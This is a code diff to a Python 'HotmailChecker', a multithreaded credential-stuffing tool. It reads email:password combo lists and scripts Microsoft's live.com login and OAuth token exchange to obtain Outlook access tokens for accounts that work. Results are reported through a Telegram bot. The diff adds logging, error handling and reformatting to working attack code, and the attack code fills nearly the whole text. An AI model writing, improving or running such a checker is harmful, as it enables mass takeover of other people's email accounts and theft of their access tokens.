@@ -26,16 +26,16 @@ class HotmailChecker:
         self.rate_limit = threading.BoundedSemaphore(500)
         self.progress_message_id = None
 
-    def create_progress_bar(self, percentage, length=25):
-        filled = int(length * percentage / 100)
-        bar = "█" * filled + "░" * (length - filled)
-        return f"[{bar}] {percentage:.1f}%"
-
     def send_message(self, text, parse_mode='HTML'):
         try:
             self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode)
         except Exception as e:
-            print(f"[Send Error] {e}")
+            print(f"[SEND ERROR] {e}")
+
+    def create_progress_bar(self, percentage, length=25):
+        filled = int(length * percentage / 100)
+        bar = "█" * filled + "░" * (length - filled)
+        return f"[{bar}] {percentage:.1f}%"
 
     def update_progress(self):
         print("[INFO] Progress thread started")
@@ -60,6 +60,7 @@ class HotmailChecker:
                 else:
                     sent = self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode='HTML')
                     self.progress_message_id = sent.message_id
+                    print(f"[INFO] Progress message created: {self.progress_message_id}")
             except Exception as e:
                 print(f"[Progress Error] {e}")
             time.sleep(5)
@@ -128,7 +129,8 @@ class HotmailChecker:
             with lock:
                 self.hit += 1
                 self.processed += 1
-        except:
+        except Exception as e:
+            print(f"[Capture Error] {e}")
             with lock:
                 self.processed += 1
 
@@ -139,30 +141,51 @@ class HotmailChecker:
             r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
             if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                 return {"status": "BAD"}
-            # Login flow (same as before)
+
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
             r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
+
             url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
             ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
             if not url_match or not ppft_match:
                 return {"status": "BAD"}
+
             post_url = url_match.group(1).replace("\\/", "/")
             ppft = ppft_match.group(1)
+
             login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
-            r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Origin": "https://login.live.com","Referer": r2.url}, allow_redirects=False, timeout=15)
+            r3 = session.post(post_url, data=login_data, headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Origin": "https://login.live.com",
+                "Referer": r2.url
+            }, allow_redirects=False, timeout=15)
+
             if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
                 return {"status": "BAD"}
+
             location = r3.headers.get("Location", "")
             if not location:
                 return {"status": "BAD"}
+
             code_match = re.search(r'code=([^&]+)', location)
             if not code_match:
                 return {"status": "BAD"}
+
             code = code_match.group(1)
-            token_data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
+            token_data = {
+                "client_info": "1",
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": code,
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+            }
             r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
+
             if r4.status_code != 200 or "access_token" not in r4.text:
                 return {"status": "BAD"}
+
             access_token = r4.json()["access_token"]
             mspcid = None
             for cookie in session.cookies:
@@ -173,7 +196,8 @@ class HotmailChecker:
             return {"status": "HIT", "token": access_token, "cid": cid}
         except requests.exceptions.Timeout:
             return {"status": "RETRY"}
-        except Exception:
+        except Exception as e:
+            print(f"[Check Account Error] {e}")
             return {"status": "RETRY"}
 
     def check_combo(self, email, password):
@@ -197,24 +221,34 @@ class HotmailChecker:
                 self.processed += 1
 
     def run(self, threads=200):
-        print(f"[INFO] Checker started with {threads} threads")
-        with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
-            lines = [line.strip() for line in f if ":" in line]
-        self.total_combos = len(lines)
+        print(f"[INFO] Checker run() started with {threads} threads")
+        try:
+            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
+                lines = [line.strip() for line in f if ":" in line]
+            self.total_combos = len(lines)
 
-        self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check...")
+            if self.total_combos == 0:
+                self.send_message("❌ No valid combos found in file!")
+                return
 
-        progress_thread = threading.Thread(target=self.update_progress, daemon=True)
-        progress_thread.start()
+            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check...")
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-            for line in lines:
-                try:
-                    email, pw = line.split(":", 1)
-                    executor.submit(self.check_combo, email.strip(), pw.strip())
-                except:
-                    continue
+            progress_thread = threading.Thread(target=self.update_progress, daemon=True)
+            progress_thread.start()
+            print("[INFO] Progress thread launched")
 
-        time.sleep(5)
-        self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad} | Retries: {self.retry}")
-        print("[INFO] Checker finished")
+            print(f"[INFO] Launching {threads} worker threads")
+            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+                for line in lines:
+                    try:
+                        email, pw = line.split(":", 1)
+                        executor.submit(self.check_combo, email.strip(), pw.strip())
+                    except:
+                        continue
+
+            time.sleep(5)
+            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad} | Retries: {self.retry}")
+            print("[INFO] Checker finished")
+        except Exception as e:
+            print(f"[Checker Run Error] {e}")
+            self.send_message("❌ Checker crashed. Check Railway logs.")
